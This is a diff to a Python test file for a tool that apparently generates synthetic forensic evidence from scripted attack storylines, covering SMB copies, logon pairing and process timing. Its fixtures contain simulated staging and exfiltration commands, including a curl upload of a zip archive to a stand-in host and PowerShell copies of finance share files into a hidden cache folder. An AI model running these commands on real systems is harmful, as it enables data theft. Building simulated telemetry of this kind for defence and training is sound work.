@@ -4,18 +4,20 @@
 """Tests for network evidence inferred from storyline commands."""
 
 import random
+from collections.abc import Callable
 from datetime import UTC, datetime, timedelta
 from types import SimpleNamespace
 from typing import Any
 
-from evidenceforge.events.contexts import FileTransferContext, HostContext
+from evidenceforge.events.content_identity import FileContentIdentity
+from evidenceforge.events.contexts import HostContext
+from evidenceforge.events.dispatcher import EventDispatcher
+from evidenceforge.events.identity import ProcessIdentity
 from evidenceforge.generation.actions import (
     HttpResponseFileTransferActionBundle,
     HttpResponseFileTransferRequest,
     ScpReceiverFileActionBundle,
     ScpReceiverFileRequest,
-    SmbFileTransferMetadataActionBundle,
-    SmbFileTransferMetadataRequest,
     StagedArchiveSmbReadActionBundle,
     StagedArchiveSmbReadRequest,
 )
@@ -25,14 +27,689 @@ from evidenceforge.generation.engine.storyline import (
     _estimate_process_lifetime,
     _linux_shell_process_command_line,
     _linux_storyline_shell_friction_commands,
+    _process_owns_storyline_multipart_upload,
     _render_storyline_shell_friction_template,
 )
-from evidenceforge.generation.source_timing import SourceTimingPlanner
 from evidenceforge.generation.state_manager import StateManager
-from evidenceforge.models.scenario import BeaconEventSpec, ConnectionEventSpec, System, User
+from evidenceforge.generation.storage_world import (
+    CompiledStorageAccess,
+    CompiledStorageFile,
+    CompiledStorageShare,
+    CompiledStorageVolume,
+    StorageWorldModel,
+)
+from evidenceforge.models.scenario import (
+    BeaconEventSpec,
+    ConnectionEventSpec,
+    DhcpLeaseEventSpec,
+    ProcessEventSpec,
+    SmbActivityEventSpec,
+    System,
+    User,
+)
+
+
+class _CapturingDispatcherProxy:
+    """Capture canonical builders while preserving the real atomic dispatcher."""
+
+    def __init__(self, delegate: Any, capture: Callable[[Any], None]) -> None:
+        self._delegate = delegate
+        self._capture = capture
+
+    def __getattr__(self, name: str) -> Any:
+        return getattr(self._delegate, name)
+
+    def prepare_builder(self, event: Any, *args: Any, **kwargs: Any) -> Any:
+        prepared = self._delegate.prepare_builder(event, *args, **kwargs)
+        self._capture(event)
+        return prepared
+
+    def dispatch_builder(self, event: Any, *args: Any, **kwargs: Any) -> Any:
+        self._capture(event)
+        return self._delegate.dispatch_builder(event, *args, **kwargs)
+
+
+def _activity_generator_with_captured_builders(
+    state_manager: StateManager,
+    capture: Callable[[Any], None],
+) -> ActivityGenerator:
+    """Build a fixture generator without bypassing prepared dispatcher contracts."""
+
+    dispatcher = EventDispatcher(state_manager=state_manager, emitters={})
+    generator = ActivityGenerator(state_manager, {}, dispatcher=dispatcher)
+    generator.dispatcher = _CapturingDispatcherProxy(dispatcher, capture)
+    return generator
 
 
 class TestStorylineCommandNetworks:
+    def test_storyline_smb_upload_consumes_remembered_local_artifact(self):
+        """A dependent SMB upload receives the exact SCP placement override."""
+
+        actor = User(username="root", full_name="Root", email="root@example.com")
+        system = System(
+            hostname="APP-INT-01",
+            ip="10.10.2.30",
+            os="Ubuntu 24.04",
+            type="server",
+        )
+        captured: list[dict[str, Any]] = []
+        engine = object.__new__(StorylineMixin)
+        engine.state_manager = _FakeStateManager()
+        engine.scenario = SimpleNamespace(environment=SimpleNamespace(users=[actor]))
+        engine.dispatcher = SimpleNamespace(storyline_cluster_id=None)
+        engine.activity_generator = SimpleNamespace(
+            generate_smb_activity=lambda **kwargs: (
+                captured.append(kwargs)
+                or SimpleNamespace(
+                    session_id="session",
+                    tree_ids=("tree",),
+                    transport_uids=("uid",),
+                    operations=(),
+                )
+            )
+        )
+        source_file = CompiledStorageFile(
+            file_id="app-local-placement",
+            share="client:APP-INT-01",
+            path="/tmp/.cache/archive.gz",
+            size_bytes=833_491,
+            mime_type="application/gzip",
+        )
+        engine._remember_storyline_file_available(
+            system=system,
+            path=source_file.path,
+            available_at=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
+            source_file=source_file,
+        )
+
+        engine._execute_typed_event(
+            spec=SmbActivityEventSpec(
+                operation="copy",
+                source={"type": "client", "path": source_file.path},
+                destination={"type": "share", "share": "FILE-LNX-01.research"},
+            ),
+            actor=actor,
+            system=system,
+            time=datetime(2026, 5, 11, 12, 1, tzinfo=UTC),
+            activity="relay archive",
+            explicit_types={"smb_activity"},
+        )
+
+        assert captured[0]["client_source_override"] == source_file
+
+    def test_http_upload_local_read_uses_process_local_principal(self):
+        """NewCredentials must not replace the local token for an upload file read."""
+        local_actor = "aisha.johnson"
+        remote_actor = User(
+            username="marcus.chen",
+            full_name="Marcus Chen",
+            email="marcus.chen@example.com",
+        )
+        system = System(
+            hostname="WS-AJOHNSON-01",
+            ip="10.10.1.35",
+            os="Windows 11",
+            type="workstation",
+        )
+        process_start = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
+        state = _FakeStateManager()
+        state.processes[(system.hostname, 6912)] = SimpleNamespace(
+            pid=6912,
+            parent_pid=6800,
+            image=r"C:\Windows\System32\curl.exe",
+            command_line=(
+                r"curl.exe -F file=@C:\ProgramData\Microsoft\cache_7f3a.zip "
+                "https://example.test/upload"
+            ),
+            username=local_actor,
+            logon_id="0x900",
+            start_time=process_start,
+        )
+        captured: list[Any] = []
+        engine = object.__new__(StorylineMixin)
+        engine.state_manager = state
+        engine.activity_generator = _FakeActivityGenerator()
+        engine.dispatcher = SimpleNamespace(dispatch_builder=captured.append)
+
+        engine._emit_http_upload_file_read(
+            actor=remote_actor,
+            system=system,
+            pid=6912,
+            process_image=r"C:\Windows\System32\curl.exe",
+            command_line=state.processes[(system.hostname, 6912)].command_line,
+            entity=SimpleNamespace(local_source_path=r"C:\ProgramData\Microsoft\cache_7f3a.zip"),
+            connection_time=process_start + timedelta(seconds=2),
+        )
+
+        assert captured[0].auth.username == local_actor
+        assert captured[0].process.username == local_actor
+
+    def test_storyline_type9_smb_browse_uses_exact_operation_process(self):
+        """Type 9 SMB browse cannot inherit an unrelated live PowerShell process."""
+        local_actor = User(username="alice", full_name="Alice", email="alice@example.com")
+        actor = User(username="admin", full_name="Admin", email="admin@example.com")
+        system = System(
+            hostname="WS-ALICE-01",
+            ip="10.10.1.20",
+            os="Windows 11",
+            type="workstation",
+        )
+        captured: list[dict[str, Any]] = []
+        created: list[dict[str, Any]] = []
+        terminated: list[dict[str, Any]] = []
+        request_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
+        unrelated_close = request_time + timedelta(seconds=4)
+
+        world = StorageWorldModel(
+            volumes=(
+                CompiledStorageVolume(
+                    id="data",
+                    system="FILE-SRV-01",
+                    mount="D:\\",
+                    filesystem="ntfs",
+                    label="Finance",
+                ),
+            ),
+            shares=(
+                CompiledStorageShare(
+                    ref="FILE-SRV-01.finance",
+                    system="FILE-SRV-01",
+                    name="Finance",
+                    volume="data",
+                    root="",
+                    preset="collaboration",
+                    population="small",
+                    activity="low",
+                    encryption="required",
+                    smb_native_filesystem="NTFS",
+                    audit="standard",
+                    access=CompiledStorageAccess(
+                        read=frozenset({"Domain Users"}),
+                        modify=frozenset(),
+                        admin=frozenset(),
+                        deny=frozenset(),
+                    ),
+                    files=(),
+                ),
+            ),
+            mappings=(),
+        )
+
+        def generate_smb_activity(**kwargs: Any) -> SimpleNamespace:
+            captured.append(kwargs)
+            return SimpleNamespace(
+                session_id="smb-session",
+                tree_ids=("tree-1",),
+                transport_uids=("Csmb",),
+                operations=(),
+                completed_at=kwargs["time"] + timedelta(seconds=2),
+            )
+
+        def generate_process(**kwargs: Any) -> int:
+            created.append(kwargs)
+            return 7000 + len(created)
+
+        def generate_process_termination(**kwargs: Any) -> None:
+            terminated.append(kwargs)
+
+        engine = object.__new__(StorylineMixin)
+        engine.dispatcher = SimpleNamespace(storyline_cluster_id=None)
+        engine.state_manager = _FakeStateManager()
+        engine.state_manager.sessions["0x900"] = SimpleNamespace(
+            username=local_actor.username,
+            system=system.hostname,
+            logon_id="0x900",
+            logon_type=9,
+            source_ip="-",
+            start_time=datetime(2026, 5, 11, 11, 59, tzinfo=UTC),
+            network_close_time=None,
+        )
+        controller = SimpleNamespace(
+            pid=6868,
+            parent_pid=6800,
+            image=r"C:\Windows\System32\cmd.exe",
+            command_line="cmd.exe /d /q",
+            username=local_actor.username,
+            logon_id="0x900",
+            start_time=datetime(2026, 5, 11, 11, 59, 30, tzinfo=UTC),
+            end_time=None,
+        )
+        unrelated_process = SimpleNamespace(
+            pid=6999,
+            parent_pid=controller.pid,
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line=(
+                'powershell.exe -NoProfile -Command "New-Item -ItemType Directory '
+                'C:\\ProgramData\\VaultCache"'
+            ),
+            username=local_actor.username,
+            logon_id="0x900",
+            start_time=request_time - timedelta(seconds=3),
+            end_time=None,
+        )
+        engine.state_manager.processes[(system.hostname, controller.pid)] = controller
+        engine.state_manager.processes[(system.hostname, unrelated_process.pid)] = unrelated_process
+        engine.scenario = SimpleNamespace(environment=SimpleNamespace(users=[local_actor, actor]))
+        engine._storyline_logon_registry = {(actor.username, system.hostname): ["0x900"]}
+        engine.activity_generator = SimpleNamespace(
+            _storage_world=world,
+            generate_process=generate_process,
+            generate_process_termination=generate_process_termination,
+            generate_smb_activity=generate_smb_activity,
+            foreground_process_termination_time=lambda _hostname, pid: (
+                unrelated_close if pid == unrelated_process.pid else None
+            ),
+            _record_user_process=lambda *_args: None,
+        )
+        engine._last_storyline_process_by_system = {
+            system.hostname: (unrelated_process.pid, unrelated_process.image)
+        }
+
+        engine._execute_typed_event(
+            spec=SmbActivityEventSpec(
+                operation="browse",
+                target={"type": "share", "share": "FILE-SRV-01.finance"},
+            ),
+            actor=actor,
+            system=system,
+            time=request_time,
+            activity="Browse files",
+            explicit_types={"smb_activity"},
+        )
+
+        assert captured[0]["process_pid"] == 7001
+        assert captured[0]["process_image"].endswith("powershell.exe")
+        assert captured[0]["client_logon_id"] == "0x900"
+        assert captured[0]["actor"] == local_actor
+        assert captured[0]["spec"].smb_principal == actor.username
+        assert r"\\FILE-SRV-01\Finance" in created[0]["command_line"]
+        assert "New-Item" not in created[0]["command_line"]
+        assert created[0]["parent_pid"] == controller.pid
+        assert created[0]["time"] > unrelated_close
+        assert terminated[0]["pid"] == 7001
+        assert terminated[0]["time"] > captured[0]["time"] + timedelta(seconds=2)
+
+        engine._execute_typed_event(
+            spec=SmbActivityEventSpec(
+                operation="browse",
+                target={"type": "share", "share": "FILE-SRV-01.finance"},
+            ),
+            actor=actor,
+            system=system,
+            time=request_time + timedelta(seconds=1),
+            activity="Browse files again",
+            explicit_types={"smb_activity"},
+        )
+
+        assert captured[1]["process_pid"] == 7002
+        assert created[1]["time"] > terminated[0]["time"]
+        assert terminated[1]["time"] > terminated[0]["time"]
+
+    def test_windows_storyline_one_shot_releases_shell_before_type9_smb(self):
+        """An unrelated bounded command closes before the next exact SMB helper starts."""
+
+        local_actor = User(username="alice", full_name="Alice", email="alice@example.com")
+        actor = User(username="admin", full_name="Admin", email="admin@example.com")
+        system = System(
+            hostname="WS-ALICE-01",
+            ip="10.10.1.20",
+            os="Windows 11",
+            type="workstation",
+        )
+        world = StorageWorldModel(
+            volumes=(
+                CompiledStorageVolume(
+                    id="data",
+                    system="FILE-SRV-01",
+                    mount="D:\\",
+                    filesystem="ntfs",
+                    label="Finance",
+                ),
+            ),
+            shares=(
+                CompiledStorageShare(
+                    ref="FILE-SRV-01.finance",
+                    system="FILE-SRV-01",
+                    name="Finance",
+                    volume="data",
+                    root="",
+                    preset="collaboration",
+                    population="small",
+                    activity="low",
+                    encryption="required",
+                    smb_native_filesystem="NTFS",
+                    audit="standard",
+                    access=CompiledStorageAccess(
+                        read=frozenset({"Domain Users"}),
+                        modify=frozenset(),
+                        admin=frozenset(),
+                        deny=frozenset(),
+                    ),
+                    files=(),
+                ),
+            ),
+            mappings=(),
+        )
+        engine = object.__new__(StorylineMixin)
+        engine.scenario = SimpleNamespace(
+            environment=SimpleNamespace(
+                systems=[system],
+                users=[local_actor, actor],
+                service_accounts=[],
+            )
+        )
+        engine.state_manager = _FakeStateManager()
+        engine.activity_generator = _FakeActivityGenerator()
+        engine.activity_generator._storage_world = world
+        engine.activity_generator.foreground_process_termination_offset = timedelta(seconds=7)
+        engine.activity_generator.generate_smb_activity = lambda **kwargs: SimpleNamespace(
+            session_id="smb-session",
+            tree_ids=("tree-1",),
+            transport_uids=("Csmb",),
+            operations=(),
+            completed_at=kwargs["time"] + timedelta(seconds=2),
+        )
+        engine.dispatcher = SimpleNamespace(visibility_engine=None, storyline_cluster_id=None)
+        start_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
+        engine.state_manager.sessions["0x900"] = SimpleNamespace(
+            username=local_actor.username,
+            system=system.hostname,
+            logon_id="0x900",
+            logon_type=9,
+            source_ip="-",
+            start_time=start_time - timedelta(minutes=1),
+            network_close_time=None,
+        )
+        controller = SimpleNamespace(
+            pid=4100,
+            parent_pid=4000,
+            image=r"C:\Windows\System32\cmd.exe",
+            command_line="cmd.exe /d /q",
+            username=local_actor.username,
+            logon_id="0x900",
+            start_time=start_time - timedelta(seconds=30),
+            end_time=None,
+        )
+        engine.state_manager.processes[(system.hostname, controller.pid)] = controller
+        engine._storyline_logon_registry = {(actor.username, system.hostname): ["0x900"]}
+
+        engine._execute_typed_event(
+            spec=ProcessEventSpec(
+                process_name=(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
+                command_line=(
+                    'powershell.exe -NoProfile -Command "New-Item -ItemType Directory '
+                    'C:\\ProgramData\\VaultCache -Force | Out-Null"'
+                ),
+                supplementary="none",
+            ),
+            actor=actor,
+            system=system,
+            time=start_time,
+            activity="Prepare local staging",
+            explicit_types={"process", "smb_activity"},
+            future_specs=(
+                SmbActivityEventSpec(
+                    operation="browse",
+                    target={"type": "share", "share": "FILE-SRV-01.finance"},
+                ),
+            ),
+        )
+
+        process = engine.activity_generator.processes[0]
+        process_pid = engine.activity_generator._next_pid
+        termination = engine.activity_generator.process_terminations[0]
+        expected_close = process["time"] + timedelta(seconds=7)
+        engine.state_manager.processes[(system.hostname, process_pid)] = SimpleNamespace(
+            pid=process_pid,
+            parent_pid=controller.pid,
+            image=process["process_name"],
+            command_line=process["command_line"],
+            username=local_actor.username,
+            logon_id="0x900",
+            start_time=process["time"],
+            end_time=termination["time"],
+        )
+
+        engine._execute_typed_event(
+            spec=SmbActivityEventSpec(
+                operation="browse",
+                target={"type": "share", "share": "FILE-SRV-01.finance"},
+            ),
+            actor=actor,
+            system=system,
+            time=start_time + timedelta(seconds=1),
+            activity="Browse Finance",
+            explicit_types={"smb_activity"},
+        )
+
+        smb_helper = engine.activity_generator.processes[1]
+        assert termination["time"] == expected_close
+        assert termination["time"] < smb_helper["time"]
+        assert r"\\FILE-SRV-01\Finance" in smb_helper["command_line"]
+        assert getattr(engine, "_pending_story_process_terminations", []) == []
+        assert engine._storyline_shell_available_at[(system.hostname, actor.username)] > (
+            expected_close
+        )
+
+    def test_storyline_type9_smb_copy_materializes_source_visible_transfer_process(self):
+        """Credentialed SMB copies run through a process whose command can create the files."""
+        actor = User(username="alice", full_name="Alice", email="alice@example.com")
+        system = System(
+            hostname="WS-ALICE-01",
+            ip="10.10.1.20",
+            os="Windows 11",
+            type="workstation",
+        )
+        share_ref = "FILE-SRV-01.finance"
+        access = CompiledStorageAccess(
+            read=frozenset({"Domain Users"}),
+            modify=frozenset({"Domain Users"}),
+            admin=frozenset(),
+            deny=frozenset(),
+        )
+        source_file = CompiledStorageFile(
+            file_id="finance-q1-budget",
+            share=share_ref,
+            path=r"Q1\Q1-budget.xlsx",
+            size_bytes=125_000,
+            mime_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
+            tags=("finance",),
+            seed_ref="q1_budget",
+        )
+        world = StorageWorldModel(
+            volumes=(
+                CompiledStorageVolume(
+                    id="data",
+                    system="FILE-SRV-01",
+                    mount="D:\\",
+                    filesystem="ntfs",
+                    label="Finance",
+                ),
+            ),
+            shares=(
+                CompiledStorageShare(
+                    ref=share_ref,
+                    system="FILE-SRV-01",
+                    name="Finance",
+                    volume="data",
+                    root="",
+                    preset="collaboration",
+                    population="small",
+                    activity="low",
+                    encryption="required",
+                    smb_native_filesystem="NTFS",
+                    audit="standard",
+                    access=access,
+                    files=(source_file,),
+                ),
+            ),
+            mappings=(),
+        )
+        created: list[dict[str, Any]] = []
+
+        def generate_process(**kwargs: Any) -> int:
+            created.append(kwargs)
+            return 7001
+
+        engine = object.__new__(StorylineMixin)
+        engine.state_manager = _FakeStateManager()
+        for process in (
+            SimpleNamespace(
+                pid=6868,
+                parent_pid=6800,
+                image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                command_line="powershell.exe -NoProfile",
+                username=actor.username,
+                logon_id="0x900",
+                start_time=datetime(2026, 5, 11, 11, 59, 30, tzinfo=UTC),
+                end_time=None,
+            ),
+            SimpleNamespace(
+                pid=6999,
+                parent_pid=6868,
+                image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                command_line="powershell.exe -NoProfile -Command Copy-Item",
+                username=actor.username,
+                logon_id="0x900",
+                start_time=datetime(2026, 5, 11, 11, 59, 58, tzinfo=UTC),
+                end_time=None,
+            ),
+        ):
+            engine.state_manager.processes[(system.hostname, process.pid)] = process
+        engine.activity_generator = SimpleNamespace(
+            _storage_world=world,
+            generate_process=generate_process,
+        )
+        spec = SmbActivityEventSpec(
+            operation="copy",
+            source={"type": "share", "share": share_ref, "file_ref": "q1_budget"},
+            destination={
+                "type": "client",
+                "path": r"C:\ProgramData\VaultCache\Q1-budget.xlsx",
+            },
+        )
+
+        pid, image, owned, effective_time, parent_pid = engine._storyline_smb_operation_process(
+            system=system,
+            actor=actor,
+            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
+            spec=spec,
+            client_logon_id="0x900",
+            parent_pid=6999,
+        )
+
+        assert (pid, image, owned) == (
+            7001,
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            True,
+        )
+        assert created[0]["logon_id"] == "0x900"
+        assert created[0]["parent_pid"] == 6868
+        assert parent_pid == 6868
+        assert effective_time == datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
+        assert created[0]["require_exact_parent"] is True
+        assert (
+            timedelta(milliseconds=2500)
+            <= (datetime(2026, 5, 11, 12, 0, tzinfo=UTC) - created[0]["time"])
+            <= timedelta(milliseconds=3200)
+        )
+        assert (
+            "Copy-Item -LiteralPath '\\\\FILE-SRV-01\\Finance\\Q1\\Q1-budget.xlsx'"
+            in (created[0]["command_line"])
+        )
+        assert "C:\\ProgramData\\VaultCache\\Q1-budget.xlsx" in created[0]["command_line"]
+
+    def test_storyline_batched_smb_copy_command_expresses_selection_and_destination(self):
+        """Batched SMB staging commands expose source scope, count, and local destination."""
+        share_ref = "FILE-LNX-01.research"
+        access = CompiledStorageAccess(
+            read=frozenset({"Domain Users"}),
+            modify=frozenset(),
+            admin=frozenset(),
+            deny=frozenset(),
+        )
+        world = StorageWorldModel(
+            volumes=(
+                CompiledStorageVolume(
+                    id="research",
+                    system="FILE-LNX-01",
+                    mount="/srv/research",
+                    filesystem="ext4",
+                    label="Research",
+                ),
+            ),
+            shares=(
+                CompiledStorageShare(
+                    ref=share_ref,
+                    system="FILE-LNX-01",
+                    name="ClinicalResearch",
+                    volume="research",
+                    root="",
+                    preset="collaboration",
+                    population="small",
+                    activity="low",
+                    encryption="required",
+                    smb_native_filesystem="EXT4",
+                    audit="standard",
+                    access=access,
+                    files=(),
+                ),
+            ),
+            mappings=(),
+        )
+        engine = object.__new__(StorylineMixin)
+        engine.activity_generator = SimpleNamespace(_storage_world=world)
+        spec = SmbActivityEventSpec(
+            operation="copy",
+            source={
+                "type": "share",
+                "share": share_ref,
+                "selector": {"extensions": [".docx", ".csv"]},
+            },
+            destination={
+                "type": "client",
+                "directory": "C:\\ProgramData\\VaultCache\\Research\\",
+            },
+            batch={"count": 3, "duration": "2s"},
+        )
+
+        command = engine._storyline_smb_operation_command(spec)
+
+        assert "Get-ChildItem -Path '\\\\FILE-LNX-01\\ClinicalResearch'" in command
+        assert "-Include '*.docx','*.csv'" in command
+        assert "Select-Object -First 3" in command
+        assert "C:\\ProgramData\\VaultCache\\Research\\" in command
+
+    def test_new_credentials_logon_keeps_local_process_actor_immutable(self):
+        """A Type 9 LUID must never acquire the outbound credential principal."""
+        local_actor = User(username="alice", full_name="Alice", email="alice@example.com")
+        outbound_actor = User(username="admin", full_name="Admin", email="admin@example.com")
+        system = System(
+            hostname="WS-ALICE-01",
+            ip="10.10.1.20",
+            os="Windows 11",
+            type="workstation",
+        )
+        engine = object.__new__(StorylineMixin)
+        engine.state_manager = _FakeStateManager()
+        engine.state_manager.sessions["0x900"] = SimpleNamespace(
+            username=local_actor.username,
+            system=system.hostname,
+            logon_id="0x900",
+            logon_type=9,
+        )
+        engine.scenario = SimpleNamespace(
+            environment=SimpleNamespace(users=[local_actor, outbound_actor])
+        )
+
+        resolved = engine._storyline_local_process_actor_for_logon(
+            outbound_actor,
+            system,
+            "0x900",
+        )
+
+        assert resolved == local_actor
+
     def test_storyline_shell_friction_renderer_rejects_unsafe_formatting(self):
         """Overlay-controlled shell-friction templates should not use Python format specs."""
         values = {
@@ -85,20 +762,78 @@ class TestStorylineCommandNetworks:
 
         assert commands == ["echo /tmp/appdb.sql", "test -s /tmp/appdb.sql"]
 
+    def test_storyline_shell_friction_stays_before_authored_process_anchor(self):
+        """Optional prep history must not reschedule its owning typed process."""
+
+        emitted: list[tuple[datetime, str]] = []
+        engine = object.__new__(StorylineMixin)
+        engine.activity_generator = SimpleNamespace(
+            _prepare_bash_history_command=lambda _system, command: command,
+            _emit_bash_command_event=lambda _actor, _system, time, command: emitted.append(
+                (time, command)
+            ),
+        )
+        actor = User(username="alice", full_name="Alice Example", email="alice@example.test")
+        system = System(
+            hostname="DB01",
+            ip="10.0.0.25",
+            os="Ubuntu 22.04",
+            type="server",
+        )
+        process_time = datetime(2026, 9, 7, 18, 25, tzinfo=UTC)
+
+        latest = engine._emit_linux_storyline_shell_friction(
+            actor=actor,
+            system=system,
+            time=process_time,
+            process_name="/usr/bin/scp",
+            command_line="scp /tmp/archive.bin archive@10.0.0.10:/srv/archive.bin",
+            output_file=None,
+            rng=random.Random(7),
+        )
+
+        assert len(emitted) == 2
+        assert [time for time, _command in emitted] == sorted(time for time, _command in emitted)
+        assert all(time < process_time for time, _command in emitted)
+        assert latest == emitted[-1][0]
+
+    def test_storyline_shell_friction_skips_when_prior_foreground_leaves_no_room(self):
+        """Preparation is omitted when it cannot fit after the preceding command."""
+
+        emitted: list[tuple[datetime, str]] = []
+        engine = object.__new__(StorylineMixin)
+        engine.activity_generator = SimpleNamespace(
+            _prepare_bash_history_command=lambda _system, command: command,
+            _emit_bash_command_event=lambda _actor, _system, time, command: emitted.append(
+                (time, command)
+            ),
+        )
+        actor = User(username="root", full_name="root", email="root@example.test")
+        system = System(hostname="DB01", ip="10.0.0.25", os="Ubuntu 22.04", type="server")
+        prior_completion = datetime(2026, 9, 7, 18, 25, tzinfo=UTC)
+        engine._storyline_shell_available_at = {
+            (system.hostname, actor.username): prior_completion,
+        }
+
+        latest = engine._emit_linux_storyline_shell_friction(
+            actor=actor,
+            system=system,
+            time=prior_completion + timedelta(seconds=1),
+            process_name="/usr/bin/gzip",
+            command_line="gzip -9 /tmp/archive.sql",
+            output_file=None,
+            rng=random.Random(7),
+        )
+
+        assert emitted == []
+        assert latest is None
+
     def test_explicit_storyline_process_ref_sets_child_parent_pid(self):
         """Explicit process_ref/parent_ref lineage should reach canonical process context."""
         captured: list[Any] = []
 
-        class _CapturingDispatcher:
-            visibility_engine = None
-
-            @staticmethod
-            def dispatch(event: Any) -> None:
-                captured.append(event)
-
         state = StateManager()
-        generator = ActivityGenerator(state, {})
-        generator.dispatcher = _CapturingDispatcher()
+        generator = _activity_generator_with_captured_builders(state, captured.append)
         actor = User(username="alice", full_name="Alice Example", email="alice@example.com")
         system = System(
             hostname="SRC",
@@ -296,6 +1031,67 @@ class TestStorylineCommandNetworks:
             system,
             datetime(2024, 3, 18, 17, 41, 0, tzinfo=UTC),
         ) == datetime(2024, 3, 18, 17, 57, 0, tzinfo=UTC)
+
+    def test_explicit_logoff_pair_is_not_stolen_by_later_shadow_session(self):
+        """Runtime session churn cannot replace an explicit successful logon pairing."""
+        state = StateManager()
+        start = datetime(2024, 3, 18, 14, 0, 0, tzinfo=UTC)
+        actor = User(username="root", full_name="Root", email="root@example.local")
+        system = System(
+            hostname="APP-INT-01",
+            ip="10.10.2.30",
+            os="Ubuntu 22.04",
+            type="server",
+        )
+        engine = object.__new__(StorylineMixin)
+        engine.start_time = start
+        engine.state_manager = state
+        engine.scenario = SimpleNamespace(
+            storyline=[
+                SimpleNamespace(
+                    id="explicit-logon",
+                    actor="root",
+                    system=system.hostname,
+                    time="+1m",
+                    events=[SimpleNamespace(type="logon", logon_type=3)],
+                ),
+                SimpleNamespace(
+                    id="explicit-close",
+                    actor="root",
+                    system=system.hostname,
+                    time="+60m",
+                    events=[SimpleNamespace(type="logoff")],
+                ),
+            ]
+        )
+        durable_id = state.create_session(
+            username=actor.username,
+            system=system.hostname,
+            logon_type=10,
+            source_ip="10.10.3.10",
+            start_time=start + timedelta(minutes=1),
+            session_kind="network",
+        )
+        engine._current_storyline_spec_id = "explicit-logon:0"
+        engine._record_storyline_logon(actor, system, durable_id)
+        shadow_id = state.create_session(
+            username=actor.username,
+            system=system.hostname,
+            logon_type=10,
+            source_ip="10.10.3.11",
+            start_time=start + timedelta(minutes=30),
+            session_kind="ssh",
+        )
+        engine._current_storyline_spec_id = ""
+        engine._record_storyline_logon(actor, system, shadow_id)
+        engine._current_storyline_spec_id = "explicit-close:0"
+
+        paired_id, plan = engine._session_end_plan_for_current_logoff()
+
+        assert paired_id == durable_id
+        assert plan.storyline_event_id == "explicit-close"
+        assert state.get_session_end_plan(durable_id) == plan
+        assert state.get_session_end_plan(shadow_id) is None
 
     def test_linux_shell_storyline_process_renders_explicit_shell_invocation(self):
         """Bare shell control syntax should be rendered as source-native bash -c argv."""
@@ -554,8 +1350,7 @@ class TestStorylineCommandNetworks:
             "www-data",
             "System",
         )
-        generator = object.__new__(ActivityGenerator)
-        generator.state_manager = state
+        generator = ActivityGenerator(state, {})
         generator._system_pids = {"WEB-EXT-01": {"apache2": apache_pid}}
         generator._recent_connection_tuples = {
             ("185.70.41.45", 61522, "203.0.113.10", 443, "tcp"): ts.timestamp() - 1200,
@@ -662,6 +1457,10 @@ class TestStorylineCommandNetworks:
             _dns_server_ips = ["10.0.0.1"]
 
             @staticmethod
+            def _dns_resolver_ips_for_source(_source_ip: str) -> list[str]:
+                return ["10.0.0.1"]
+
+            @staticmethod
             def generate_connection(**kwargs: Any) -> None:
                 captured.update(kwargs)
 
@@ -697,15 +1496,14 @@ class TestStorylineCommandNetworks:
                 return event.event_type == "process_create"
 
             def emit(self, event: Any) -> None:
-                host = event.src_host
-                proc = event.process
-                process_start_time = proc.start_time or event.timestamp
-                self.render_time = SourceTimingPlanner().source_time(
-                    event,
-                    "source.ecar_process_create",
-                    seed_parts=(host.hostname, proc.pid, process_start_time),
-                    not_before=process_start_time,
-                )
+                assert event.source_timing is not None
+                ecar_times = [
+                    value
+                    for key, value in event.source_timing.source_times.items()
+                    if key.startswith("source.ecar_process_create|")
+                ]
+                assert ecar_times
+                self.render_time = max(ecar_times)
 
         emitter = _ProcessTimingEmitter()
         state_manager = StateManager()
@@ -731,20 +1529,22 @@ class TestStorylineCommandNetworks:
         )
 
         assert emitter.render_time is not None
-        assert generator.process_source_create_time(system.hostname, pid) >= emitter.render_time
+        source_bound = generator.process_source_create_bound(system, pid)
+        assert source_bound is not None
+        assert source_bound >= emitter.render_time
 
     def test_activity_generator_preplans_process_create_time_before_threaded_dispatch(self):
         captured: dict[str, Any] = {}
 
-        class _CapturingDispatcher:
-            @staticmethod
-            def dispatch(event: Any) -> None:
-                if event.event_type == "process_create":
-                    captured["event"] = event
+        def capture_process_create(event: Any) -> None:
+            if event.event_type == "process_create":
+                captured["event"] = event
 
         state_manager = StateManager()
-        generator = ActivityGenerator(state_manager, {})
-        generator.dispatcher = _CapturingDispatcher()
+        generator = _activity_generator_with_captured_builders(
+            state_manager,
+            capture_process_create,
+        )
         actor = User(username="alice", full_name="Alice Example", email="alice@example.com")
         system = System(
             hostname="SRC",
@@ -781,23 +1581,23 @@ class TestStorylineCommandNetworks:
             for key, value in event.source_timing.source_times.items()
             if key.startswith("source.windows_security_process_create|")
         )
-        assert security_time >= sysmon_time + timedelta(milliseconds=25)
-        assert generator.process_source_create_time(system.hostname, pid) == max(
-            event.source_timing.source_times.values()
-        )
+        assert abs((security_time - sysmon_time).total_seconds()) <= 0.021
+        source_bound = generator.process_source_create_bound(system, pid)
+        assert source_bound is not None
+        assert source_bound >= max(event.source_timing.source_times.values())
 
     def test_process_preplan_waits_for_session_source_ready_time(self):
         captured: dict[str, Any] = {}
 
-        class _CapturingDispatcher:
-            @staticmethod
-            def dispatch(event: Any) -> None:
-                if event.event_type == "process_create":
-                    captured["event"] = event
+        def capture_process_create(event: Any) -> None:
+            if event.event_type == "process_create":
+                captured["event"] = event
 
         state_manager = StateManager()
-        generator = ActivityGenerator(state_manager, {})
-        generator.dispatcher = _CapturingDispatcher()
+        generator = _activity_generator_with_captured_builders(
+            state_manager,
+            capture_process_create,
+        )
         actor = User(username="svc_mhsync", full_name="Sync Service", email="svc@example.com")
         system = System(
             hostname="FILE-SRV-01",
@@ -832,27 +1632,15 @@ class TestStorylineCommandNetworks:
         source_times = event.source_timing.source_times
         floor = ready_time + timedelta(milliseconds=1)
         assert all(timestamp >= floor for timestamp in source_times.values())
